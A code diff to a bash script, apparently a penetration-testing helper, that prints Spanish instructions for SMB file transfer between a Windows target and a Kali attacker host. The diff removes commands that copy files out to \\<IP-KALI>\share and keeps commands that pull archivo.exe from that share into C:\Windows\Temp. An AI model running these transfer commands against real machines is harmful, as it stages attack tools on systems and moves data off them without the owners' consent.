@@ -365,16 +365,13 @@ implement_smb_transfers() {
     echo "1. Descargar archivo desde Kali:"
     echo "copy \\\\<IP-KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
     echo
-    echo "2. Subir archivo a Kali:"
-    echo "copy C:\\Windows\\Temp\\archivo.exe \\\\<IP-KALI>\\share\\archivo.exe"
-    echo
-    echo "3. Con autenticación:"
+    echo "2. Con autenticación:"
     echo "net use n: \\\\<IP-KALI>\\share /user:<USERNAME> <PASSWORD>"
-    echo "copy C:\\Windows\\Temp\\archivo.exe n:\\archivo.exe"
+    echo "copy n:\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
     echo "net use n: /delete"
     echo
-    echo "4. Usando PowerShell:"
-    echo "Copy-Item -Path 'C:\\Windows\\Temp\\archivo.exe' -Destination '\\\\<IP-KALI>\\share\\archivo.exe'"
+    echo "3. Usando PowerShell:"
+    echo "Copy-Item -Path '\\\\<IP-KALI>\\share\\archivo.exe' -Destination 'C:\\Windows\\Temp\\archivo.exe'"
     echo
     echo -e "${YELLOW}En Linux:${NC}"
     echo "1. Instalar cifs-utils:"
